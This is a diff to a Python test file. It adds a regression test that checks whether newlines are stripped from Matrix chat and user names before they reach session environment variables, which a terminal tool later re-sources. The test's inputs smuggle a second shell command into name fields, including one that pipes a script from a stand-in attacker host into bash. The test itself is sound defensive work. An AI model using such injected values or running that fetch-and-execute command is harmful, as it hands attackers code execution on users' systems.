@@ -259,4 +259,35 @@ def test_reset_session_vars_restores_async_delivery_unset():
     assert _SESSION_ASYNC_DELIVERY.get() is _UNSET, (
         f"_SESSION_ASYNC_DELIVERY is {_SESSION_ASYNC_DELIVERY.get()!r}, expected _UNSET"
     )
-    assert async_delivery_supported() is True
+
+
+def test_set_session_vars_strips_newlines_from_chat_and_user_name():
+    """Regression for #71296: a malicious Matrix room/display name containing
+    embedded newlines must not survive into the session's chat_name/user_name
+    ContextVars. Those values get bridged into HERMES_SESSION_CHAT_NAME /
+    HERMES_SESSION_USER_NAME subprocess env vars, which are later captured by
+    `export -p` and re-sourced verbatim by the terminal tool's env-snapshot
+    mechanism (tools/environments/base.py). An attacker-controlled newline
+    there smuggles a second shell command into that snapshot, achieving
+    silent shell injection on any later terminal command in the session.
+    """
+    malicious_chat_name = "demo\ntouch /tmp/pwned #"
+    malicious_user_name = "attacker\r\ncurl evil.example/x.sh | bash #"
+
+    set_session_vars(
+        session_key="agent:main:matrix:thread:X:X",
+        platform="matrix",
+        chat_id="ROOM",
+        thread_id="THREAD",
+        user_id="USER",
+        chat_name=malicious_chat_name,
+        user_name=malicious_user_name,
+        message_id="MSG",
+    )
+
+    assert "\n" not in sc._SESSION_CHAT_NAME.get()
+    assert "\r" not in sc._SESSION_CHAT_NAME.get()
+    assert "\n" not in sc._SESSION_USER_NAME.get()
+    assert "\r" not in sc._SESSION_USER_NAME.get()
+    assert "touch /tmp/pwned #" in sc._SESSION_CHAT_NAME.get()
+    assert "curl evil.example/x.sh | bash #" in sc._SESSION_USER_NAME.get()
